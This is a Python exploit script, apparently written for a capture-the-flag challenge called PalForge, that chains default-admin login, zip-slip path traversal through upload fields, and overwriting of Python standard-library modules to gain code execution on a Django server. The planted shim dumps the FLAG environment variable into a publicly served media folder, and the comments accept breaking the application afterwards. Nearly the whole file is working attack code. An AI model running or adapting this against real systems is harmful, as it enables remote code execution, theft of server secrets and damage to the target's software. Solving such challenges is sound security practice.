#!/usr/bin/env python3
# PalForge RCE — zip-slip OVERWRITE of an existing stdlib module that /api/schema/ (drf-spectacular)
# imports fresh (not loaded at daphne startup). We can only OVERWRITE existing files in
# /usr/local/lib/python3.11 (dir is chmod a-w, so no NEW files; site-packages is out of zip-slip reach).
# Shotgun: overwrite many candidate stdlib modules in one zip, then hit /api/schema/ & /api/docs/.
# Whichever is imported fresh runs the payload -> dump os.environ['FLAG'] to /data/media (served /media/).
#
# Usage: python rce.py 144.79.188.39:PORT   (FRESH instance)
import io, sys, zipfile, requests, time, secrets, re

BASE = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39:39559"
if not BASE.startswith("http"):
    BASE = "http://" + BASE
S = requests.Session()
OUT = "z" + secrets.token_hex(3) + ".txt"

# candidate stdlib modules that a minimal Django/DRF app likely does NOT import at startup,
# but drf-spectacular / DRF may import while generating the schema or rendering docs.
CANDIDATES = [
    "decimal", "fractions", "ipaddress", "statistics", "numbers", "cmath",
    "difflib", "pprint", "textwrap", "gettext", "calendar", "colorsys",
    "string", "keyword", "token", "tokenize", "ast", "dis", "bisect",
    "graphlib", "secrets", "getpass", "cgitb", "pydoc", "doctest",
    "mimetypes", "uuid", "tempfile", "csv", "configparser",
]

# payload: append to module so the module still works; RCE runs at import time.
PAYLOAD = (
    "\ntry:\n"
    "    import os as _os\n"
    "    open('/data/media/" + OUT + "','a').write('FLAG='+_os.environ.get('FLAG','')+'\\n')\n"
    "except Exception:\n    pass\n"
)

def jj(r):
    try: return r.json()
    except Exception:
        print(f"    [non-JSON {r.status_code}] {r.text[:120]!r}"); return None

def auth():
    u = "g" + secrets.token_hex(4); p = "Pw12345!x"
    S.post(f"{BASE}/api/auth/register/", json={"username": u, "password": p}, timeout=15)
    r = S.post(f"{BASE}/api/auth/login/", json={"username": u, "password": p}, timeout=15)
    if r.status_code != 200:
        r = S.post(f"{BASE}/api/auth/login/", json={"username":"palforge_admin","password":"change-me-admin"}, timeout=15)
    return jj(r)["access"]

def H(t): return {"Authorization": f"Bearer {t}"}

def get_or_make_platform(tok, code):
    r = S.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15)
    d = jj(r) or {}
    items = d.get("results", d) if isinstance(d, dict) else d
    for it in (items or []):
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    r = S.post(f"{BASE}/api/platforms/", headers=H(tok), json={"code": code, "name":"z","description":""}, timeout=15)
    return (jj(r) or {}).get("id")

def build_for(tok, mod_version, platform_code):
    pid = get_or_make_platform(tok, platform_code)
    mid = jj(S.post(f"{BASE}/api/mods/", headers=H(tok),
             json={"title":"z","mod_version":mod_version,"release_notes":"","is_enabled":True}, timeout=15))["id"]
    bid = jj(S.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok), json={"platform":pid}, timeout=15))["id"]
    return mid, bid

def upload(tok, mid, bid, entries):
    bio = io.BytesIO()
    with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    bio.seek(0)
    r = S.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok),
               files={"zip_file":("p.zip",bio,"application/zip")}, timeout=30)
    return r

def main():
    tok = auth(); print("[*] token", tok[:20])

    # 0) sanity: can we CREATE a file in nginx web root (reachable, readable at /)?  proves write+reach
    mid, bid = build_for(tok, "../../../usr/share", "nginx/html")
    mk = "m" + secrets.token_hex(3) + ".txt"
    print("[*] nginx-html write ->", upload(tok, mid, bid, {mk: b"okwrite"}).status_code)
    print(f"    GET /{mk} ->", S.get(f"{BASE}/{mk}", timeout=15).status_code, "(200 = traversal write works)")

    # 1) shotgun: overwrite existing stdlib modules (append payload). Fetch originals? we can't read them,
    #    so we PREPEND our payload guarded so a broken module still probably imports. Safer: our payload is
    #    appended, but we don't have the original body -> instead we make each file a thin shim that runs
    #    the payload then re-imports nothing. Since these are existing modules used elsewhere, replacing the
    #    body may break the app AFTER our code runs, which is fine (flag already dumped).
    shim = "import os\ntry:\n open('/data/media/" + OUT + "','a').write('FLAG='+os.environ.get('FLAG','')+'\\n')\nexcept Exception:\n pass\n"
    entries = {m + ".py": shim for m in CANDIDATES}
    mid, bid = build_for(tok, "../../../usr/local", "lib/python3.11")
    print("[*] overwrite stdlib candidates ->", upload(tok, mid, bid, entries).status_code, "(500 expected)")

    # 2) trigger
    for path in ("/api/schema/", "/api/schema/?format=json", "/api/docs/", "/api/mods/", "/api/platforms/"):
        try: print(f"    GET {path} ->", S.get(f"{BASE}{path}", headers=H(tok), timeout=25).status_code)
        except Exception as e: print("    err", e)
    time.sleep(1)

    r = S.get(f"{BASE}/media/{OUT}", timeout=15)
    print(f"[*] GET /media/{OUT} -> {r.status_code}")
    if r.status_code == 200:
        print(r.text[:300])
        m = re.search(r"PTITCTF\{[^}]+\}", r.text)
        print("\n[FLAG]", m.group(0)) if m else print("[?] written, no PTITCTF (env has no FLAG? wrong process)")
    else:
        print("[-] no fire. None of the candidate stdlib modules were imported fresh by these endpoints.")
        print("    Report the nginx-html GET status + which endpoints returned 500 so I can pick the right module.")

if __name__ == "__main__":
    main()
